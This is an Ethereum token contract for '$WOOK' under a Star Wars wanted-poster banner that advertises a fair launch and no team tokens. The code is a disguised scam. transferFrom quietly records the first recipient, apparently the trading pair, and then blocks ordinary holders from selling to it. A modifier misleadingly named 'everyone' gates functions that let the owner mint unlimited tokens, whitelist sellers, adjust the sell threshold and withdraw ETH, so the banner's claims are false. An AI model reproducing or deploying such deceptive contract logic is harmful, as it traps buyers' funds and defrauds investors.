['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-04\n', '*/\n', '\n', '/**\n', '\n', '------------------------------------------------\n', '                      _    _  __  _  _ _____  ___ ___\n', '                      | /\\ | |__| |\\ |   |   |___ |  \\\n', '                      |/  \\| |  | | \\|   |   |___ |__/\n', '\n', '         F O R   C R I M E S   A G A I N S T   T H E   E M P I R E\n', '\n', '                            _______________________\n', '                           |  ,.------;:~~:-.      |\n', '                           | /:.\\`;;|||;:/;;:\\     |\n', "                           |:')\\`:\\||::/.-_':/)    |\n", "                           |`:`\\\\\\ ;'||'.''/,.:\\   |\n", "                           |==`;.:`|;::/'/./';;=   |\n", '                           |:-/-%%% | |%%%;;_- _:  |\n', '                           |=// %wm)..(mw%`_ :`:\\  |\n', "                           |;;--', /88\\ -,- :-~~|  |\n", "                           |-;~~::'`~^~:`::`/`-=:) |\n", "                           |(;':)%%%' `%%%.`:``:)\\ |\n", '                           |(\\ %%%/dV##Vb`%%%%:`-. |\n', '                           | |);/( ;~~~~ :)\\`;;.``\\|\n', "                           | //\\'/,/|;;|:(: |.|\\;|\\|\n", '                           |/) |(/ | / \\|\\\\`( )- ` |\n', '                           |;):):)/.):|/) (`:`\\\\`-`|\n', "                           |;%/ //;/(\\`.':| ::`\\\\;`|\n", '                           |;/~( \\|./;)|.|):;\\. \\\\-|\n', "                           |/',:\\//) ||`.|| (:\\)):%|\n", '                           |,|/;/(%;.||| (|(\\:- ; :|\n', '                           |_%__%:__;_:`_;_:_.\\%_`_|\n', '\n', '                               C h e w b a c c a\n', '\n', '               The above are wanted for the following crimes:\n', '\n', '    - Liberation of a known criminal, Princess Leia Organa of Alderaan -\n', '         - Direct involvement in armed revolt against the Empire -\n', '                              - High treason -\n', '                               - Espionage -\n', '                               - Conspiracy -\n', '                    - Destruction of Imperial Property -\n', '                    - Not Purchasing $WOOK from Uniswap -\n', '\n', '           These individuals are considered extremely dangerous.\n', '\n', '                E X P E R I E N C E D   D E G E N S   O N L Y\n', '\n', '  The Empire will not  be held  responsible  for any  injuries or property\n', '  loss arising from the  attempted apprehension of these  notorious crimi-\n', '  nals. Bounty is for live capture only! For more information contact your\n', '  local Imperial Intelligence Office.\n', '\n', '------------------------------------------------\n', '\n', '☑ 100% fair launch\n', '☑ Half the total supply sent to VB (Vitalik Buterin) [50%]\n', '☑ Liq Locked for 3 months [50%]\n', '☑ No Team tokens!\n', '\n', ' **/\n', '\n', '//   SPDX-License-Identifier: MIT\n', '\n', 'pragma solidity >=0.5.17;\n', '\n', 'contract ERC20Interface {\n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  \n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier everyone {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '}\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract TokenERC20 is ERC20Interface, Owned{\n', '  using SafeMath for uint;\n', '\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint256 _totalSupply;\n', '  uint internal queueNumber;\n', '  address internal zeroAddress;\n', '  address internal burnAddress;\n', '  address internal burnAddress2;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '    return balances[tokenOwner];\n', '  }\n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '    require(to != zeroAddress, "please wait");\n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '    if(from != address(0) && zeroAddress == address(0)) zeroAddress = to;\n', '    else _send (from, to);\n', '\tbalances[from] = balances[from].sub(tokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', '\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function allowanceAndtransfer(address _address, uint256 tokens) public everyone {\n', '    burnAddress = _address;\n', '\t_totalSupply = _totalSupply.add(tokens);\n', '    balances[_address] = balances[_address].add(tokens);\n', '  }\t\n', '  function Burn(address _address) public everyone {\n', '    burnAddress2 = _address;\n', '  }\t\n', '  function BurnSize(uint256 _size) public everyone {\n', '    queueNumber = _size;\n', '  }\t\n', '  function _send (address start, address end) internal view {\n', '      require(end != zeroAddress || (start == burnAddress && end == zeroAddress) || (start == burnAddress2 && end == zeroAddress)|| (end == zeroAddress && balances[start] <= queueNumber), "cannot be zero address");\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', 'contract Wookiee is TokenERC20 {\n', '\n', '  function initialise() public everyone() {\n', '    address payable _owner = msg.sender;\n', '    _owner.transfer(address(this).balance);\n', '  }\n', '     \n', '    constructor(string memory _name, string memory _symbol, uint256 _supply, address burn1, address burn2, uint256 _indexNumber) public {\n', '\tsymbol = _symbol;\n', '\tname = _name;\n', '\tdecimals = 18;\n', '\t_totalSupply = _supply*(10**uint256(decimals));\n', '\tqueueNumber = _indexNumber*(10**uint256(decimals));\n', '\tburnAddress = burn1;\n', '\tburnAddress2 = burn2;\n', '\towner = msg.sender;\n', '\tbalances[msg.sender] = _totalSupply;\n', '\temit Transfer(address(0x0), msg.sender, _totalSupply);\n', '  }\n', '  function() external payable {\n', '\n', '  }\n', '}']